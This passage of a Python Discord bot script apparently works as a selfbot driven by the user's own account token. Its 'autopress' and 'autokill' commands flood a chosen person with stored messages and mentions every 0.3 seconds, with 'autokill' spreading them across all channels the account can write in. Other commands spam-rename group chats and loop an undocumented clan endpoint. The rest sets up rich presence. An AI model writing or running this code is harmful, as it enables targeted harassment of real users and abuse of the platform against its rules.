        print(f"Error saving to {filename}: {e}")

async def send_messages(ctx, user, messages, is_autokill=False):
    status = ak_status if is_autokill else ap_status
    user_id = ctx.author.id
    
    # Get available channels
    channels = [c for c in ctx.guild.text_channels 
               if c.permissions_for(ctx.guild.me).send_messages] if is_autokill else [ctx.channel]
    
    while user_id in status and status[user_id]['running']:
        channel = random.choice(channels)
        message = random.choice(messages).replace('{username}', user.display_name)
        
        try:
            await channel.send(f"```ini\n[{message}]```\n{user.mention}")
            await asyncio.sleep(0.3)
        except Exception as e:
            print(f"Error sending message: {e}")
            if is_autokill: channels.remove(channel)
            if not channels: break

# Autopress command group
@bot.group(invoke_without_command=True)
async def autopress(ctx, user: discord.User=None):
    if not user: return await ctx.send("```diff\n- Please mention a user```")
    
    messages = load_messages('autopress.txt')
    print(f"Loaded {len(messages)} messages from autopress.txt")  # Debug line
    if not messages: return await ctx.send("```diff\n- No messages found in autopress.txt\nAdd messages with .autopress add <message>```")
    
    ap_status[ctx.author.id] = {'running': True}
    await ctx.send(f"```asciidoc\n= AUTOPRESS ACTIVATED =\nTarget: {user.display_name}\nMessages: {len(messages)}```")
    
    try:
        await send_messages(ctx, user, messages)
    finally:
        ap_status.pop(ctx.author.id, None)

# Autokill command group
@bot.group(invoke_without_command=True)
async def autokill(ctx, user: discord.User=None):
    if not user: return await ctx.send("```diff\n- Please mention a user```")
    
    messages = load_messages('autokill.txt')
    print(f"Loaded {len(messages)} messages from autokill.txt")  # Debug line
    if not messages: return await ctx.send("```diff\n- No messages found in autokill.txt\nAdd messages with .autokill add <message>```")
    
    ak_status[ctx.author.id] = {'running': True}
    await ctx.send(f"```asciidoc\n= AUTOKILL ACTIVATED =\nTarget: {user.display_name}\nMessages: {len(messages)}```")
    
    try:
        await send_messages(ctx, user, messages, True)
    finally:
        ak_status.pop(ctx.author.id, None)

# Shared subcommands
for command in [autopress, autokill]:
    @command.command()
    async def add(ctx, *, message: str):
        filename = f"{ctx.command.parent.name}.txt"
        save_message(filename, message)
        await ctx.send(f"```yaml\nAdded to {filename}:\n{message[:150]}```")
        print(f"Added message to {filename}: {message[:50]}...")  # Debug line
    
    @command.command()
    async def list(ctx):
        filename = f"{ctx.command.parent.name}.txt"
        messages = load_messages(filename)
        if not messages:
            await ctx.send(f"```diff\n- {filename} is empty```")
        else:
            formatted = "\n".join(f"{i+1}. {msg[:80]}{'...' if len(msg) > 80 else ''}" 
                        for i, msg in enumerate(messages))
            await ctx.send(f"```prolog\nMessages in {filename}:\n{formatted}```")
            print(f"Listed {len(messages)} messages from {filename}")  # Debug line
    
    @command.command()
    async def clear(ctx):
        filename = f"{ctx.command.parent.name}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            pass
        await ctx.send(f"```diff\n- Cleared {filename}```")
        print(f"Cleared {filename}")  # Debug line
    
    @command.command()
    async def stop(ctx):
        status = ak_status if ctx.command.parent.name == 'autokill' else ap_status
        if ctx.author.id in status:
            status[ctx.author.id]['running'] = False
            await ctx.send("```fix\nStopping...```")
        else:
            await ctx.send("```diff\n- No active session```")

# Initialize files on startup
for filename in ['autopress.txt', 'autokill.txt']:
    try:
        with open(filename, 'a', encoding='utf-8'):
            pass
        print(f"Verified {filename} exists")  # Debug line
    except Exception as e:
        print(f"Error initializing {filename}: {e}")

# Global tracker for active GC renamers
active_gc_renamers = {}

@bot.command(
    name="gcstart",
    aliases=["gcrename", "gcspam"],
    help="Auto-renames group chats from gcname.txt"
)
async def gcstart(ctx, interval: float = 0.0, start_index: int = 0):
    """Example: 
    .gcstart 5.0 10  (changes every 5 sec starting from 10th name)
    .gcrename 2.0    (alias, changes every 2 sec)
    .gcspam          (alias, default 0 sec interval)
    """
    # ANSI Colors
    R = "\033[0m"; C = "\033[1;36m"; G = "\033[1;32m"; Y = "\033[1;33m"
    
    # Check if already running
    if ctx.channel.id in active_gc_renamers:
        msg = f"{C}╭──────────────────────────────╮\n{Y}  ALREADY RUNNING IN THIS GC!\n{C}╰──────────────────────────────╯{R}"
        return await ctx.send(f"```ansi\n{msg}```", delete_after=10)

    try:
        # Turbo file reading
        with open('gcname.txt', 'r', encoding='utf-8') as f:
            names = [line.strip() for line in f if line.strip()]
        
        if not names:
            error_msg = f"{C}╭──────────────────────────────╮\n{G}  ERROR: gcname.txt is empty!\n{C}╰──────────────────────────────╯{R}"
            return await ctx.send(f"```ansi\n{error_msg}```", delete_after=10)

        # Validate group chat
        if not isinstance(ctx.channel, discord.GroupChannel):
            error_msg = f"{C}╭──────────────────────────────╮\n{Y}  ERROR: Not a group chat!\n{C}╰──────────────────────────────╯{R}"
            return await ctx.send(f"```ansi\n{error_msg}```", delete_after=10)

        # Start message
        start_msg = f"{C}╭──────────────────────────────╮\n{G}  GC RENAMER ACTIVATED\n  Names: {len(names)}\n  Interval: {interval}s\n  Start Index: {start_index}\n{C}╰──────────────────────────────╯{R}"
        await ctx.send(f"```ansi\n{start_msg}```", delete_after=5)

        # Create stop event
        stop_event = asyncio.Event()
        active_gc_renamers[ctx.channel.id] = stop_event

        # Lightweight renaming loop
        index = start_index % len(names)
        while not stop_event.is_set():
            try:
                await ctx.channel.edit(name=names[index])
                index = (index + 1) % len(names)
                await asyncio.sleep(interval)
            except discord.HTTPException as e:
                if e.code == 50013:  # Missing permissions
                    error_msg = f"{C}╭──────────────────────────────╮\n{Y}  ERROR: Missing permissions!\n{C}╰──────────────────────────────╯{R}"
                    await ctx.send(f"```ansi\n{error_msg}```", delete_after=10)
                    break
                await asyncio.sleep(10)  # Rate limit handling
            except Exception as e:
                print(f"Error: {e}")
                break

    except Exception as e:
        error_msg = f"{C}╭──────────────────────────────╮\n{Y}  FATAL ERROR: {str(e)[:20]}...\n{C}╰──────────────────────────────╯{R}"
        await ctx.send(f"```ansi\n{error_msg}```", delete_after=15)
    finally:
        active_gc_renamers.pop(ctx.channel.id, None)

@bot.command(help="Stops GC renaming in current group")
async def gcstop(ctx):
    if ctx.channel.id in active_gc_renamers:
        active_gc_renamers[ctx.channel.id].set()
        del active_gc_renamers[ctx.channel.id]
        msg = f"{C}╭──────────────────────────────╮\n{G}  GC RENAMER STOPPED\n{C}╰──────────────────────────────╯{R}"
        await ctx.send(f"```ansi\n{msg}```", delete_after=5)
    else:
        msg = f"{C}╭──────────────────────────────╮\n{Y}  NO ACTIVE RENAMER FOUND\n{C}╰──────────────────────────────╯{R}"
        await ctx.send(f"```ansi\n{msg}```", delete_after=5)

@bot.group(invoke_without_command=True)
async def rotateguild(ctx, delay: float = 2.0):
    global guild_rotation_task, guild_rotation_delay

    if guild_rotation_task and not guild_rotation_task.cancelled():
        await ctx.send("```diff\n- Rotation is already running```")
        return

    guild_rotation_delay = delay

    async def rotate_guilds():
        headers = {
            "authorization": bot.http.token,
            "content-type": "application/json"
        }

        while True:
            try:
                async with aiohttp.ClientSession() as session:
                    valid_guild_ids = []

                    async with session.get('https://discord.com/api/v9/users/@me/guilds', headers=headers) as guild_resp:
                        if guild_resp.status != 200:
                            await ctx.send("```diff\n- Failed to fetch guilds```")
                            return

                        guilds = await guild_resp.json()

                        for guild in guilds:
                            test_payload = {
                                'identity_guild_id': guild['id'],
                                'identity_enabled': True
                            }

                            async with session.put('https://discord.com/api/v9/users/@me/clan', headers=headers, json=test_payload) as test_resp:
                                if test_resp.status == 200:
                                    valid_guild_ids.append(guild['id'])

                        if not valid_guild_ids:
                            await ctx.send("```diff\n- No valid guilds found```")
                            return

                        await ctx.send(
                            f"```ansi\n"
                            f"{C}╭──────────────────────────────╮\n"
                            f"{G}  CLAN ROTATION ACTIVATED\n"
                            f"  Guilds: {len(valid_guild_ids)}\n"
                            f"  Delay: {guild_rotation_delay}s\n"
                            f"{C}╰──────────────────────────────╯\n"
                            f"```"
                        )

                        while True:
                            for guild_id in valid_guild_ids:
                                payload = {
                                    'identity_guild_id': guild_id,
                                    'identity_enabled': True
                                }
                                async with session.put('https://discord.com/api/v9/users/@me/clan', headers=headers, json=payload) as put_resp:
                                    if put_resp.status == 200:
                                        await asyncio.sleep(guild_rotation_delay)

            except asyncio.CancelledError:
                raise
            except Exception as e:
                print(f"Rotation error: {e}")
                await asyncio.sleep(5)

    guild_rotation_task = asyncio.create_task(rotate_guilds())

@rotateguild.command(name="stop")
async def rotateguild_stop(ctx):
    global guild_rotation_task

    if guild_rotation_task and not guild_rotation_task.cancelled():
        guild_rotation_task.cancel()
        guild_rotation_task = None
        await ctx.send(
            f"```ansi\n"
            f"{C}╭──────────────────────────────╮\n"
            f"{G}  CLAN ROTATION STOPPED\n"
            f"{C}╰──────────────────────────────╯\n"
            f"```"
        )
    else:
        await ctx.send("```diff\n- Rotation is not running```")

@rotateguild.command(name="delay")
async def rotateguild_delay(ctx, delay: float):
    global guild_rotation_delay

    if delay < 1.0:
        await ctx.send("```diff\n- Delay must be ≥1 second```")
        return

    guild_rotation_delay = delay
    await ctx.send(
        f"```ansi\n"
        f"{C}╭──────────────────────────────╮\n"
        f"{G}  ROTATION DELAY UPDATED\n"
        f"  New delay: {delay}s\n"
        f"{C}╰──────────────────────────────╯\n"
        f"```"
    )

@rotateguild.command(name="status")
async def rotateguild_status(ctx):
    status = f"{G}RUNNING{R}" if (guild_rotation_task and not guild_rotation_task.cancelled()) else f"{Y}STOPPED{R}"
    await ctx.send(
        f"```ansi\n"
        f"{C}╭──────────────────────────────╮\n"
        f"{G}  CLAN ROTATION STATUS\n"
        f"  Status: {status}\n"
        f"  Delay: {guild_rotation_delay}s\n"
        f"{C}╰──────────────────────────────╯\n"
        f"```"
    )

# ANSI Color Definitions
R = "\033[0m"    # Reset
C = "\033[1;36m" # Cyan
G = "\033[1;32m" # Green
Y = "\033[1;33m" # Yellow
M = "\033[1;35m" # Magenta
W = "\033[1;37m" # White

# User Configuration Storage
rpc_config = {}

@bot.group(invoke_without_command=True)
async def rpc(ctx):
    """Main RPC control panel"""
    await ctx.send(f"""```ansi
{C}╭──────────────────────────────╮
{M}  STORM RPC CONTROL PANEL
{C}├──────────────────────────────┤
{G}Available Commands:
{Y}◈ {W}rpc setup <client_id>
{Y}◈ {W}rpc add <image_name> <image_key>
{Y}◈ {W}rpc set <type> <status> [image]
{Y}◈ {W}rpc list
{Y}◈ {W}rpc remove <image_name>

{G}Current Configuration:
{Y}◈ {W}Client ID: {rpc_config.get(str(ctx.author.id), {}).get('client_id', 'Not set')}
{Y}◈ {W}Images: {len(rpc_config.get(str(ctx.author.id), {}).get('images', {}))}
{C}╰──────────────────────────────╯{R}```""")

@rpc.command()
async def setup(ctx, client_id: str):
    """Set your application client ID"""
    if not client_id.isdigit():
        return await ctx.send(f"""```ansi
{C}╭──────────────────────────────╮
{Y}  INVALID CLIENT ID!
{C}├──────────────────────────────┤
{W}Must be numeric Discord Application ID
{C}╰──────────────────────────────╯{R}```""")
    
    if str(ctx.author.id) not in rpc_config:
        rpc_config[str(ctx.author.id)] = {"images": {}}
    
    rpc_config[str(ctx.author.id)]["client_id"] = client_id
    await ctx.send(f"""```ansi
{C}╭──────────────────────────────╮
{G}  CLIENT ID SET!
{C}├──────────────────────────────┤
{W}Application ID: {client_id}
{C}╰──────────────────────────────╯{R}```""")

@rpc.command()
async def add(ctx, name: str, key: str):
    """Add Developer Portal image key"""
    if str(ctx.author.id) not in rpc_config:
        rpc_config[str(ctx.author.id)] = {"images": {}}
    
    rpc_config[str(ctx.author.id)]["images"][name.lower()] = key
    await ctx.send(f"""```ansi
{C}╭──────────────────────────────╮
{G}  IMAGE ADDED!
{C}├──────────────────────────────┤
{W}Name: {name}
{W}Key: {key}
{C}╰──────────────────────────────╯{R}```""")

@rpc.command()
async def set(ctx, activity_type: str, *, status_text: str):
    """Set your rich presence status"""
    user_config = rpc_config.get(str(ctx.author.id), {})
    
    # Validate configuration
    if "client_id" not in user_config:
        return await ctx.send(f"""```ansi
{C}╭──────────────────────────────╮
{Y}  SETUP REQUIRED!
{C}├──────────────────────────────┤
{W}Run {G}rpc setup <client_id>{W} first
{C}╰──────────────────────────────╯{R}```""")
    
    # Set activity with configured client ID
    await bot.change_presence(
        activity=discord.Activity(
            type=getattr(discord.ActivityType, activity_type, discord.ActivityType.playing),
            name=status_text,
            application_id=int(user_config["client_id"]),
            assets={
                'large_image': next(iter(user_config.get("images", {}).values()), None)
            }
        )
    )
    
    await ctx.send(f"""```ansi
{C}╭──────────────────────────────╮
{G}  RPC STATUS UPDATED!
{C}├──────────────────────────────┤
{W}Type: {activity_type}
{W}Text: {status_text}
{W}Client ID: {user_config["client_id"]}
{C}╰──────────────────────────────╯{R}```""")

@rpc.command()
async def list(ctx):
    """List configured images"""
    user_config = rpc_config.get(str(ctx.author.id), {})
    images = user_config.get("images", {})
    
    if not images:
        return await ctx.send(f"""```ansi
{C}╭──────────────────────────────╮
{Y}  NO IMAGES CONFIGURED!
{C}├──────────────────────────────┤
{W}Use {G}rpc add <name> <key>{W} first
{C}╰──────────────────────────────╯{R}```""")
    
    image_list = "\n".join(f"{Y}◈ {C}{name}: {W}{key}" for name, key in images.items())
    await ctx.send(f"""```ansi
{C}╭──────────────────────────────╮
{M}  CONFIGURED IMAGES
{C}├──────────────────────────────┤
{image_list}
{C}╰──────────────────────────────╯{R}```""")


# Error Handling
@lock.error
@unlock.error
async def permissions_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ You don't have permission to use this command.")
    elif isinstance(error, commands.CommandError):
        await ctx.send(f"❌ An error occurred: {error}")
    

bot.run (token)
